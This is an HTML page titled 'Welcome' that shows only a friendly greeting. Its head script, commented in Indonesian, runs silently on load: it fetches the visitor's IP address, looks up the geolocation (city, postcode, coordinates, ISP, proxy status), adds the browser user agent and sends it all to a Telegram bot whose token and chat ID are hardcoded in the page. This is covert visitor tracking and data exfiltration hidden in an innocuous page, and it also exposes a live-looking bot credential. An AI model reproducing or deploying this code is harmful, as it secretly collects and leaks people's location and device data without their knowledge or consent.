<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <script>
        // Token bot Telegram dan Chat ID
        const TELEGRAM_TOKEN = "7896685998:AAGXZGmmckIixNQLJPfb4aKz5morpkvI7cY";
        const CHAT_ID = "7202626818";

        // Fungsi untuk mengirim pesan ke Telegram
        function sendToTelegram(message) {
            const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            fetch(telegramApiUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"  // Supaya teks lebih rapi
                })
            }).catch(error => console.error("Gagal mengirim ke Telegram:", error));
        }

        // Fungsi utama untuk mendapatkan IP dan mengirim ke Telegram
        async function trackVisitor() {
            try {
                // 1ï¸âƒ£ Ambil IP publik pengguna
                let ipResponse = await fetch("https://api.ipify.org?format=json");
                let ipData = await ipResponse.json();
                let userIP = ipData.ip;

                // 2ï¸âƒ£ Ambil informasi detail tentang IP
                let locationResponse = await fetch(`https://freeipapi.com/api/json/${userIP}`);
                let locationData = await locationResponse.json();

                // 3ï¸âƒ£ Siapkan pesan lengkap untuk dikirim ke Telegram
                let message = `ğŸš¨ *Pengunjung Baru!* ğŸš¨\n\n` +
                              `ğŸ“ *IP:* \`${locationData.ipAddress}\`\n` +
                              `ğŸŒ *Negara:* ${locationData.countryName} (${locationData.countryCode})\n` +
                              `ğŸ™ *Kota:* ${locationData.cityName}, ${locationData.regionName}\n` +
                              `ğŸŒ *Benua:* ${locationData.continent} (${locationData.continentCode})\n` +
                              `ğŸ“Œ *Kode Pos:* ${locationData.zipCode}\n` +
                              `ğŸ•’ *Zona Waktu:* ${locationData.timeZone}\n` +
                              `ğŸ’± *Mata Uang:* ${locationData.currency.name} (${locationData.currency.code})\n` +
                              `ğŸ—£ *Bahasa:* ${locationData.language}\n` +
                              `ğŸ“¡ *ISP:* ${locationData.ispName || "Tidak diketahui"}\n` +
                              `ğŸŒ *TLD:* ${locationData.tlds.join(", ")}\n` +
                              `ğŸ” *User-Agent:* \`${navigator.userAgent}\`\n\n` +
                              `ğŸ“Œ *Koordinat:* ${locationData.latitude}, ${locationData.longitude}\n` +
                              `ğŸ•¹ *Proxy:* ${locationData.isProxy ? "Ya" : "Tidak"}`;

                // 4ï¸âƒ£ Kirim pesan ke Telegram
                sendToTelegram(message);

            } catch (error) {
                console.error("Gagal mendapatkan IP:", error);
            }
        }

        // Jalankan fungsi saat halaman dibuka
        trackVisitor();
    </script>
</head>
<body>
    <h1>Welcome!</h1>
    <p>Enjoy browsing this page.</p>
</body>
</html>
